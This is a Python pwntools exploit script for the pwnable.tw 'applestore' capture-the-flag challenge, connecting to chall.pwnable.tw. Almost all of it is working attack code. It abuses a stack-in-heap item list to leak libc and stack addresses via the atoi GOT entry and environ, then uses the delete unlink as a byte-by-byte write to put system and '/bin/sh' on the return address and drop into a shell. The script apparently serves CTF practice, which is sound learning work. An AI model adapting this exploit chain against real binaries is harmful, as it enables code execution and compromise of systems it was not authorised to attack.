from pwn import *
#io = process('./applestore')
io = remote('chall.pwnable.tw',10104)
context.log_level = 'debug'
pause()

def menu(idx):
    io.recvuntil('>')
    io.sendline(str(idx))

def add(idx):
    menu(2)
    io.recvuntil('>')
    io.sendline(str(idx))
    
def remove(idx):
    menu(3)
    io.recvuntil('>')
    io.sendline(str(idx))

def list(idx):
    menu(4)
    io.recvuntil('>')
    io.sendline('y')

def checkout():
    io.recvuntil('>')
    io.send('5' + 'a' * 0x14)
    io.recvuntil('>')
    io.send('y')

def overwrite(addr, value):
    v = [0] * 4 
    v[0] = value & 0xff
    v[1] = (value >> 8) & 0xff
    v[2] = (value >> 16) & 0xff
    v[3] = (value >> 24) & 0xff

    for i in range(0, 4):
        menu(3)
        io.recvuntil('>')
        io.sendline('27' + p32(atoi_got) + p32(1) + p32(0x804be00 + v[i]) + p32(addr - 8 + i)) # the atoi_got doesnt matters

# calculate the num of the product by z3
for i in range(0, 9):
    add(1)
for i in range(0, 15):
    add(2)
add(3)
add(4)
checkout() # trigger the stack use in heap chain

# use delete to leak addr in libc
menu(3) # use delete
io.recvuntil('>') 
atoi_got = 0x804b040
exit_got = 0x804b030
io.sendline('27' + p32(atoi_got))
io.recvuntil('27:')
atoi_libc = u32(io.recvn(4))
log.info('atoi_libc :' + hex(atoi_libc))

l = ELF('/tmp/libc')
libc_main = atoi_libc - l.symbols['atoi']
system_libc = libc_main + l.symbols['system']
environ = libc_main + l.symbols['environ']
binsh = libc_main + l.search('/bin/sh').next()

# use delete to leak stack addr 
menu(3)
io.recvuntil('>')
io.sendline('27' + p32(environ))
io.recvuntil('27:')
stack_addr = u32(io.recvn(4))
log.info('stack_addr :' + hex(stack_addr))

# use dword shot to make system to ret_addr
ret_addr = 0xff957c1c - 0xff957cdc + stack_addr
overwrite(ret_addr, system_libc)
overwrite(ret_addr + 4, binsh)
overwrite(ret_addr + 8, binsh)
# it used a stack addr in heap chain, so we can make a dword shot by delete, and then we can use the dword shot to www
# by the overwrite function
# because addr after 0x804be00 is writeable, and we can use it to write byte by byte to the dest addr
# awesome technique by ling
io.interactive()
